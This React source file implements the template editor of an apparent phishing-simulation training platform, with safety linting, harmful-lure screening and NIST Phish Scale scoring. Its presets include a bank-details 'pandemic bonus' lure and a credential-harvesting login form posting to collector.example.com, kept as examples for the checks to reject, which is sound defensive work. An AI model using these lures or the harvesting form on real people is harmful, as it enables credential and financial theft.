'use client';

import { useEffect, useRef, useState, useTransition } from 'react';
import { createTemplate, screenDraft, type ScreenResult } from '@/lib/actions/templates';

/**
 * The Template Studio.
 *
 * Three independent checks run as the author types, and all three are shown
 * side by side rather than hidden behind a validate button:
 *
 *   safety-lint  10 rules. A FAIL makes the template unsavable, full stop.
 *   ethics       harmful-lure themes, with the real incident that makes each
 *                one a rule rather than an opinion.
 *   Phish Scale  cue count and premise alignment → NIST difficulty.
 *
 * The presets exist so the two instructive failures can be reproduced in one
 * click: a lure that is harmful, and a template that tries to collect a
 * credential.
 */

const SAFE_PRESET = `<div style="font-family:Arial,sans-serif;font-size:14px;color:#222;max-width:560px">
  <p>Hello {{firstName}},</p>
  <p>A shipment addressed to you at {{department}} is held at the hub pending a
     customs charge of INR 240.</p>
  <p><a href="{{clickUrl}}">Review shipment NC-4471-PQ</a></p>
  <p>Regards,<br />Nimbus Courier Updates</p>
  <p style="font-size:11px;color:#777">
    Not expecting this? <a href="{{reportUrl}}">Report it</a>.
  </p>
  <img src="{{pixelUrl}}" width="1" height="1" alt="" />
  {{watermark}}
</div>`;

const HARMFUL_PRESET = `<div style="font-family:Arial,sans-serif;font-size:14px;color:#222;max-width:560px">
  <p>Dear colleague,</p>
  <p>In recognition of your work during the pandemic, a one-off payment has been
     approved for all frontline staff. Please confirm your bank details to
     receive it with this month's payroll.</p>
  <p><a href="{{clickUrl}}">Confirm bank details</a></p>
  <p><a href="{{reportUrl}}">Report this message</a></p>
  {{watermark}}
</div>`;

const CREDENTIAL_PRESET = `<div style="font-family:Arial,sans-serif;font-size:14px">
  <p>Your session has expired. Please sign in again.</p>
  <form action="https://collector.example.com/login" method="post">
    <input type="text" name="username" placeholder="Email" />
    <input type="password" name="password" placeholder="Password" />
    <button type="submit">Sign in</button>
  </form>
  <p><a href="{{reportUrl}}">Report this message</a></p>
  {{watermark}}
</div>`;

interface Draft {
  name: string;
  subject: string;
  fromName: string;
  fromAddress: string;
  channel: string;
  scenario: string;
  premiseAlignment: number;
  html: string;
}

const PRESETS: Record<string, Partial<Draft>> = {
  courier: {
    name: 'Courier redelivery — customs charge',
    subject: 'Shipment NC-4471-PQ held pending a customs charge',
    fromName: 'Nimbus Courier Updates',
    fromAddress: 'updates@nimbus-courier.test',
    premiseAlignment: 4,
    html: SAFE_PRESET,
  },
  bonus: {
    name: 'Pandemic recognition bonus',
    subject: 'COVID-19 recognition bonus — confirm your bank details',
    fromName: 'Anita Deshpande',
    fromAddress: 'a.deshpande@nimbus-exec.test',
    premiseAlignment: 5,
    html: HARMFUL_PRESET,
  },
  credential: {
    name: 'Session expired sign-in',
    subject: 'Action required: confirm your identity',
    fromName: 'IT Service Desk',
    fromAddress: 'servicedesk@nimbus-it-support.test',
    premiseAlignment: 4,
    html: CREDENTIAL_PRESET,
  },
};

const PREMISE_LABELS = [
  '',
  'Implausible — nothing like this arrives in this role',
  'Unlikely — conceivable but unusual',
  'Plausible — this kind of message does arrive',
  'Expected — matches a real recurring workflow',
  'Expected right now — matches a workflow live this week',
];

export default function StudioEditor() {
  const [draft, setDraft] = useState<Draft>({
    name: '',
    subject: '',
    fromName: '',
    fromAddress: '',
    channel: 'EMAIL',
    scenario: 'T1566.002',
    premiseAlignment: 3,
    html: SAFE_PRESET,
  });
  const [screen, setScreen] = useState<ScreenResult | null>(null);
  const [saving, startSaving] = useTransition();
  const [saveError, setSaveError] = useState<string | null>(null);
  const [savedId, setSavedId] = useState<string | null>(null);
  const timer = useRef<number | undefined>(undefined);

  const set = <K extends keyof Draft>(key: K, value: Draft[K]) =>
    setDraft((d) => ({ ...d, [key]: value }));

  // Debounced live screening. Nothing is written, so this is safe per keystroke.
  useEffect(() => {
    window.clearTimeout(timer.current);
    timer.current = window.setTimeout(() => {
      void screenDraft(draft)
        .then(setScreen)
        .catch(() => setScreen(null));
    }, 350);
    return () => window.clearTimeout(timer.current);
  }, [draft]);

  const applyPreset = (key: string) => {
    const preset = PRESETS[key];
    if (preset) setDraft((d) => ({ ...d, ...preset }));
    setSavedId(null);
    setSaveError(null);
  };

  const save = () => {
    setSaveError(null);
    startSaving(async () => {
      const form = new FormData();
      for (const [k, v] of Object.entries(draft)) form.set(k, String(v));
      const result = await createTemplate(form);
      if (result.ok && result.templateId) setSavedId(result.templateId);
      else setSaveError(result.error ?? 'Could not save.');
    });
  };

  const lintFailures = screen?.lint.findings.filter((f) => f.severity === 'FAIL') ?? [];
  const lintWarnings = screen?.lint.findings.filter((f) => f.severity === 'WARN') ?? [];
  const blocked = screen?.ethics.status === 'BLOCKED';

  const field =
    'mt-1.5 w-full rounded-lg border border-ink-line bg-ink px-3 py-2 text-sm text-slate-100 outline-none focus:border-accent';
  const label = 'block text-[11px] font-medium uppercase tracking-wide text-slate-500';

  return (
    <div className="grid gap-6 lg:grid-cols-[minmax(0,1fr)_380px]">
      {/* ------------------------------------------------------------ editor */}
      <div>
        <div className="mb-4 flex flex-wrap gap-2">
          <span className="self-center text-xs text-slate-500">Load an example:</span>
          <button type="button" onClick={() => applyPreset('courier')} className="rounded-lg border border-ink-line px-3 py-1.5 text-xs text-slate-300 transition hover:border-accent">
            Legitimate lure
          </button>
          <button type="button" onClick={() => applyPreset('bonus')} className="rounded-lg border border-accent-warm/40 px-3 py-1.5 text-xs text-accent-warm transition hover:border-accent-warm">
            Harmful lure
          </button>
          <button type="button" onClick={() => applyPreset('credential')} className="rounded-lg border border-accent-bad/40 px-3 py-1.5 text-xs text-accent-bad transition hover:border-accent-bad">
            Credential harvester
          </button>
        </div>

        <div className="space-y-4 rounded-xl border border-ink-line bg-ink-soft p-5">
          <label className={label}>
            Template name
            <input className={field} value={draft.name} onChange={(e) => set('name', e.target.value)} />
          </label>

          <label className={label}>
            Subject
            <input className={field} value={draft.subject} onChange={(e) => set('subject', e.target.value)} />
          </label>

          <div className="grid gap-4 sm:grid-cols-2">
            <label className={label}>
              From name
              <input className={field} value={draft.fromName} onChange={(e) => set('fromName', e.target.value)} />
            </label>
            <label className={label}>
              From address
              <input className={field} value={draft.fromAddress} onChange={(e) => set('fromAddress', e.target.value)} />
            </label>
          </div>

          <div className="grid gap-4 sm:grid-cols-2">
            <label className={label}>
              Channel
              <select className={field} value={draft.channel} onChange={(e) => set('channel', e.target.value)}>
                <option value="EMAIL">Email</option>
                <option value="QR">QR code (quishing)</option>
                <option value="SMS_SIM">SMS (simulated in-platform)</option>
                <option value="VOICE_TABLETOP">Voice tabletop</option>
              </select>
            </label>
            <label className={label}>
              MITRE ATT&amp;CK technique
              <select className={field} value={draft.scenario} onChange={(e) => set('scenario', e.target.value)}>
                <option value="T1566.001">T1566.001 — Spearphishing Attachment</option>
                <option value="T1566.002">T1566.002 — Spearphishing Link</option>
                <option value="T1566.003">T1566.003 — Spearphishing via Service</option>
                <option value="T1566.004">T1566.004 — Spearphishing Voice</option>
                <option value="T1598">T1598 — Phishing for Information</option>
              </select>
            </label>
          </div>

          <div>
            <label className={label} htmlFor="premise">
              Premise alignment — how well does this fit the audience&apos;s real work?
            </label>
            <input
              id="premise"
              type="range"
              min={1}
              max={5}
              value={draft.premiseAlignment}
              onChange={(e) => set('premiseAlignment', Number(e.target.value))}
              className="mt-2 w-full accent-blue-500"
            />
            <p className="mt-1 text-xs text-slate-400">{PREMISE_LABELS[draft.premiseAlignment]}</p>
          </div>

          <label className={label}>
            Body HTML
            <textarea
              className={`${field} h-64 font-mono text-xs leading-relaxed`}
              value={draft.html}
              onChange={(e) => set('html', e.target.value)}
              spellCheck={false}
            />
          </label>

          <p className="text-xs leading-relaxed text-slate-500">
            Links may only be <code className="font-mono">{'{{clickUrl}}'}</code>,{' '}
            <code className="font-mono">{'{{pixelUrl}}'}</code>,{' '}
            <code className="font-mono">{'{{qrUrl}}'}</code> or{' '}
            <code className="font-mono">{'{{reportUrl}}'}</code>. Each expands to an opaque 128-bit
            token, which is how no URL ever carries personal data.
          </p>
        </div>

        <div className="mt-4 flex flex-wrap items-center gap-3">
          <button
            type="button"
            onClick={save}
            disabled={saving || !screen?.canSave}
            className="rounded-lg bg-accent px-4 py-2.5 text-sm font-semibold text-white transition hover:bg-accent/85 disabled:cursor-not-allowed disabled:opacity-40"
          >
            {saving ? 'Saving…' : 'Save template'}
          </button>
          {screen && !screen.canSave && (
            <span className="text-xs text-accent-bad">
              Cannot be saved while safety linting fails.
            </span>
          )}
          {blocked && screen?.canSave && (
            <span className="text-xs text-accent-warm">
              Will save as BLOCKED — sendable only after a People/HR override.
            </span>
          )}
        </div>

        {saveError && (
          <div className="mt-3 rounded-lg border border-accent-bad/40 bg-accent-bad/10 px-4 py-3 text-sm text-accent-bad">
            {saveError}
          </div>
        )}
        {savedId && (
          <div className="mt-3 rounded-lg border border-accent-good/40 bg-accent-good/10 px-4 py-3 text-sm text-accent-good">
            Saved.{' '}
            <a href={`/templates/${savedId}`} className="underline">
              Open {savedId}
            </a>
          </div>
        )}
      </div>

      {/* ----------------------------------------------------------- screening */}
      <aside className="space-y-4">
        {/* ethics */}
        <div
          className={`rounded-xl border p-4 ${
            blocked
              ? 'border-accent-bad/50 bg-accent-bad/10'
              : screen?.ethics.status === 'FLAGGED'
                ? 'border-accent-warm/50 bg-accent-warm/10'
                : 'border-ink-line bg-ink-soft'
          }`}
        >
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-semibold uppercase tracking-wide text-slate-400">
              Harmful-lure screen
            </h3>
            <span
              className={`rounded px-2 py-0.5 text-[10px] font-bold uppercase ${
                blocked
                  ? 'bg-accent-bad/25 text-accent-bad'
                  : screen?.ethics.status === 'FLAGGED'
                    ? 'bg-accent-warm/25 text-accent-warm'
                    : 'bg-accent-good/20 text-accent-good'
              }`}
            >
              {screen?.ethics.status ?? '…'}
            </span>
          </div>

          {screen?.ethics.findings.length === 0 && (
            <p className="mt-2 text-xs text-slate-500">
              No harmful theme detected. The taxonomy covers compensation, redundancy, bereavement,
              medical, immigration, children, legal threats and disciplinary action.
            </p>
          )}

          {screen?.ethics.findings.map((f) => (
            <div key={f.themeId} className="mt-3 border-t border-ink-line pt-3 first:border-0 first:pt-0">
              <div className="flex items-baseline justify-between gap-2">
                <span className="text-sm font-medium text-white">{f.label}</span>
                <span className="text-[10px] font-bold uppercase text-slate-500">{f.severity}</span>
              </div>
              <p className="mt-1 text-xs leading-relaxed text-slate-400">{f.rationale}</p>
              <p className="mt-1.5 text-[11px] text-slate-500">
                Matched: <span className="font-mono">{f.matched.join(', ')}</span>
              </p>
              {f.precedent && (
                <div className="mt-2 rounded-lg border border-ink-line bg-ink/50 p-3">
                  <p className="text-[11px] font-semibold text-accent-warm">{f.precedent.title}</p>
                  <p className="mt-1 text-[11px] leading-relaxed text-slate-400">
                    {f.precedent.summary}
                  </p>
                  <a
                    href={f.precedent.source}
                    target="_blank"
                    rel="noreferrer noopener"
                    className="mt-1.5 inline-block text-[11px] text-accent underline decoration-dotted"
                  >
                    Source
                  </a>
                </div>
              )}
            </div>
          ))}
        </div>

        {/* lint */}
        <div
          className={`rounded-xl border p-4 ${
            lintFailures.length > 0 ? 'border-accent-bad/50 bg-accent-bad/10' : 'border-ink-line bg-ink-soft'
          }`}
        >
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-semibold uppercase tracking-wide text-slate-400">
              Safety lint
            </h3>
            <span
              className={`rounded px-2 py-0.5 text-[10px] font-bold uppercase ${
                lintFailures.length > 0
                  ? 'bg-accent-bad/25 text-accent-bad'
                  : 'bg-accent-good/20 text-accent-good'
              }`}
            >
              {screen?.lint.status ?? '…'}
            </span>
          </div>

          {lintFailures.length === 0 && (
            <p className="mt-2 text-xs text-slate-500">
              All {screen?.lint.rulesRun.length ?? 10} rules pass. No credential field, no form
              action, no script, no personal data in any URL.
            </p>
          )}

          {[...lintFailures, ...lintWarnings].map((f, i) => (
            <div key={`${f.ruleId}-${i}`} className="mt-3 border-t border-ink-line pt-3 first:border-0 first:pt-0">
              <div className="flex items-baseline justify-between gap-2">
                <span className="font-mono text-[11px] text-slate-400">{f.ruleId}</span>
                <span
                  className={`text-[10px] font-bold uppercase ${
                    f.severity === 'FAIL' ? 'text-accent-bad' : 'text-accent-warm'
                  }`}
                >
                  {f.severity}
                </span>
              </div>
              <p className="mt-1 text-xs text-slate-200">{f.message}</p>
              <p className="mt-1 text-[11px] text-slate-500">{f.remedy}</p>
            </div>
          ))}
        </div>

        {/* phish scale */}
        <div className="rounded-xl border border-ink-line bg-ink-soft p-4">
          <div className="flex items-center justify-between">
            <h3 className="text-xs font-semibold uppercase tracking-wide text-slate-400">
              NIST Phish Scale
            </h3>
            <span className="rounded bg-accent/15 px-2 py-0.5 text-[10px] font-bold uppercase text-accent">
              {screen?.scale.difficulty ?? '…'}
            </span>
          </div>

          {screen && (
            <>
              <dl className="mt-3 grid grid-cols-2 gap-2 text-xs">
                <div>
                  <dt className="text-slate-500">Cues detected</dt>
                  <dd className="text-slate-200">
                    {screen.scale.cueCount} ({screen.scale.cueCountBand})
                  </dd>
                </div>
                <div>
                  <dt className="text-slate-500">Premise</dt>
                  <dd className="text-slate-200">{screen.scale.premiseBand}</dd>
                </div>
                <div>
                  <dt className="text-slate-500">Metric weight</dt>
                  <dd className="text-slate-200">×{screen.scale.difficultyWeight}</dd>
                </div>
              </dl>
              <p className="mt-2 text-[11px] leading-relaxed text-slate-500">
                Fewer cues and a premise that fits the recipient&apos;s real work make a message
                harder to detect. Outcomes are weighted by this, so a programme cannot improve its
                numbers by sending easier lures.
              </p>
              <ul className="mt-3 space-y-1.5">
                {screen.scale.cues.map((c) => (
                  <li key={c.id} className="text-[11px] text-slate-400">
                    <span className="text-slate-300">{c.label}</span>
                    {c.anchor && <span className="ml-1 font-mono text-slate-600">“{c.anchor.text}”</span>}
                  </li>
                ))}
              </ul>
            </>
          )}
        </div>
      </aside>
    </div>
  );
}
